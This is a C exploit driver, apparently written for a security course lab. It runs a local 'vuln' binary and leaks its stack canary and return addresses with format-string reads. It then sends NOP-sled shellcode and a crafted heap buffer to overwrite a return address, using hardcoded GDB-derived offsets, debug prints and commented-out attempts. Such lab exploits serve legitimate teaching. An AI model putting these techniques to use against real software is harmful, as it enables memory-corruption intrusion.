#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_GRP 1001

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i]))
         fputc(buf[i], stderr);
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   unsigned seed;

   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;
   create_subproc("./vuln", nargv);

   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");

   getchar();

   // Run vuln program under GDB. Set breakpoints in main_loop, auth and g
   // to figure out and populate the following values

   void *auth_bp = 0xbfa3b1f8;     // saved ebp for auth function
 //--  void *mainloop_bp = 0xbfa3b7f8; // saved ebp for main_loop
   void *auth_ra = 0x0804899f;     // return address for auth
   void *mainloop_ra = 0x08049385; // return address for main_loop

   // The following refer to locations on the stack
   void *auth_user = 0xbfa3b030; //0xbfa3b1b4      // _value_ of user variable in auth
   void *auth_canary_loc = 0xbfa3b1bc; // location where auth's canary is stored
   void *auth_bp_loc = 0xbfa3b1c8;     // location of auth's saved bp
   void *auth_ra_loc = 0xbfa3b1cc;     // location of auth's return address
   void *g_authd = 0xbfa3b1e4;         // location of authd variable of g

   void *mainloop_ra_loc = 0xbfa6e16c;
   void *mainloop_bp = 0xbfa6e198;
   void *auth_user2 = 0xbfa6d9d0;
   unsigned mainloop_bp_ra_diff = mainloop_bp - mainloop_ra_loc;

   // These values discovered above using GDB will vary across the runs, but the
   // differences between similar variables are preserved, so we compute those.
   unsigned mainloop_auth_bp_diff = mainloop_bp - auth_bp;
   unsigned mainloop_auth_ra_diff = mainloop_ra - auth_ra;

   unsigned auth_canary_user_diff = auth_canary_loc - auth_user;
   unsigned auth_bp_user_diff = auth_bp_loc - auth_user;
   unsigned auth_ra_user_diff = auth_ra_loc - auth_user;
   unsigned g_authd_auth_user_diff = g_authd - auth_user;

   void *auth_user_g = 0xbfa667b0;
   void *auth_bp_loc_g = 0xbfa66948;
   void *g_bp = 0xbfa66f48;
   void *mainloop_bp_g = 0xbfa66f78;
   void *mainloop_ra_g = 0x08049385;
   void *g_ra = 0x080491da;
   void *g_canary_loc = 0xbfa6696c;
   void *g_ra_loc = 0xbfa6697c;
   unsigned g_canary_user_diff = g_canary_loc - auth_user_g;
   unsigned g_bp_user_diff = auth_bp_loc_g - auth_user_g;
   unsigned g_ra_user_diff = g_ra_loc - auth_user_g;
   unsigned mainloop_g_bp_diff = mainloop_bp_g - g_bp;
   unsigned mainloop_g_ra_diff = mainloop_ra_g - g_ra;
   

   void *mainloop_user_loc = 0xb7f43f0c;
   void *mainloop_bp_heap = 0xbf892988;
   unsigned heaploc_mainloop_user_diff = mainloop_bp_heap - mainloop_user_loc;

   // Use GDB + trial&error to figure out the correct offsets where the the
   // stack canary, the saved ebp value, and the return address for the
   // main_loop function are stored. Use those offsets in the place of the
   // numbers in the format string below.
   put_str("e %367$x %370$x %371$x %358$x\n");
   send();

   // Once all of the above information has been populated, you are ready to run
   // the exploit.
   fprintf(stderr, "error1\n");
   fprintf(stderr, "mainloop bp to ra diff is %x\n", mainloop_bp_ra_diff);
   fprintf(stderr, "error2\n");
   unsigned cur_canary, cur_mainloop_bp, cur_mainloop_ra, cur_mainloop_user;
   get_formatted("%x%x%x%x", &cur_canary, &cur_mainloop_bp, &cur_mainloop_ra, &cur_mainloop_user);
   fprintf(stderr, "driver: Extracted canary=%x, bp=%x, ra=%x, mainloop_user=%x\n",
           cur_canary, cur_mainloop_bp, cur_mainloop_ra, cur_mainloop_user);

   fprintf(stderr, "mainloop ra loc is %x\n", cur_mainloop_bp - mainloop_bp_ra_diff);
   fprintf(stderr, "error3\n");
   // Allocate and prepare a buffer that contains the exploit string.
   // The exploit starts at auth's user, and should go until g's authd, so
   // allocate an exploit buffer of size g_authd_auth_user_diff+sizeof(authd)
   unsigned explsz = sizeof(int) + g_authd_auth_user_diff;
   void* *expl = (void**)malloc(explsz);
   fprintf(stderr, "error4\n");
   // fprintf(stderr, "error2\n");
   // Initialize the buffer with '\0', just to be on the safe side.
   memset((void*)expl, '\0', explsz);
   // Now initialize the parts of the exploit buffer that really matter. Note
   // that we don't have to worry about endianness as long as the exploit is
   // being assembled on the same architecture/OS as the process being
   // exploited.

   //char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xB8\x04\x8F\x04\x08\xFF\xD0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"; //making call directly
   //char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x89\xE8\x01\x05\x5C\x02\x00\x00\x8B\x18\x29\x1D\xE1\x01\x00\x00\xFF\xD3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
   unsigned mainloop_bp_user_diff = mainloop_bp - auth_user2;
   void* cur_auth_user = cur_mainloop_bp - mainloop_bp_user_diff;
   
   // fprintf(stderr, "error4\n");
 //  memcpy(expl,payload,strlen(payload));

   // expl[g_canary_user_diff/sizeof(void*)] = (void*)cur_canary;
   // expl[g_bp_user_diff/sizeof(void*)] = (void*)(cur_mainloop_bp - mainloop_g_bp_diff);
   // expl[g_ra_user_diff/sizeof(void*)] = (void*)(cur_mainloop_ra - mainloop_g_ra_diff);


   // expl[auth_canary_user_diff/sizeof(void*)] = (void*)cur_canary;
   // expl[auth_bp_user_diff/sizeof(void*)] = 
   //    (void*)(cur_mainloop_bp - mainloop_auth_bp_diff);
   // expl[auth_ra_user_diff/sizeof(void*)] = (void*)(cur_mainloop_ra - mainloop_auth_ra_diff);


   // expl[g_authd_auth_user_diff/sizeof(void*)] = 0;
   
   fprintf(stderr, "auth user location: %x\n", cur_auth_user+4);//bfbbc454

   // Now, send the payload
   char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xB8\x04\x8F\x04\x08\xFF\xD0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
//B8048F04  08 FF10
   put_str("u ");

   void* *heapinject = (void**)malloc(40);
   memset((void*)heapinject, '\0', 40);
   memcpy(heapinject, payload, strlen(payload));
   put_bin((char*)heapinject, 40);

   put_str("\n");
   send();

   put_str("e %358$x\n");
   send();
   get_formatted("%x", &cur_mainloop_user);
   fprintf(stderr, "driver: mainloop_user=%x\n", cur_mainloop_user);


   put_str("p ");
   
   unsigned cur_mainloop_ra_loc = cur_mainloop_bp - mainloop_bp_ra_diff - 16;
   unsigned auth_user_loc = cur_auth_user+4;
   fprintf(stderr, "error5\n");
  
   // void* *locations = (void**)malloc(strlen(cur_mainloop_ra_loc) + strlen(auth_user_loc));
   // fprintf(stderr, "error6\n");current
   // memset((void*)locations, '\0', 8);
   // fprintf(stderr, "error7\n");
   // strcat(locations, );
   // strcat(locations, cur_mainloop_ra_loc);
   // fprintf(stderr, "error8\n");
   // strcat(locations, auth_user_loc);
   // fprintf(stderr, "error9\n");
   // fprintf(stderr, "after concatenating: %s\n", locations);

   void* *heapexpl = (void**)malloc(280);
   memset((void*)heapexpl, '\0', 265);
   char heapPaylod[] = "\x00\x00\x00\x00\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\x00\x00\x00\x00\xf4\x00\x00\x00\xf4\x00\x00\x00"; //\x08\x04\x8f\x24\x24\x8f\x04\x08\x08\x04\x8f\x24";
   // heapPaylod[65] = cur_mainloop_ra_loc & 0xff;
   // heapPaylod[66] = auth_user_loc & 0xff;

   fprintf(stderr, "appended string is: %s\n", heapPaylod);
   memcpy(heapexpl+1, heapPaylod, 252);
   *(int*)((char *)heapexpl + 256) = (char*)cur_mainloop_ra_loc;

   *(int*)((char *)heapexpl + 260) = (char*)(cur_mainloop_user+8); 
  // strcat(heapexpl, locations);
   put_bin((char*)heapexpl, 265);
  // put_str("p \xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\xab\xcd\0\0\0\0\0\0\0\x08\x04\x8f\x24");
   //put_str("p abcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcd\n");
   send();

   put_str("l \n");
   send();

   put_str("q \n");
   send();

   usleep(100000);
   get_formatted("%*s");


   kill(pid, SIGINT);
   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}